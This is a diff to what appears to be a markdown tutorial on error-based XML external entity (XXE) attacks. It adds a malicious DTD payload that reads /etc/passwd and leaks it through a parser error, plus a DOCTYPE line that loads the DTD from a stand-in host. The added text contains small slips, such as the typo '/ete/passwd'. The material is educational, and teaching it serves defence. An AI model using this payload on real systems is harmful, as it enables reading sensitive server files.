@@ -250,8 +250,14 @@ This DTD carries out the following steps:
 
 You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:
 
-`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`
-
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd"> 
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
+%error;
+```
+then all you need to is 
+`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YourWebsite"> %xxe; ]>`
+which will cause error and show the file (and the file here is `/ete/passwd`)
 This DTD carries out the following steps:
 
 - Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
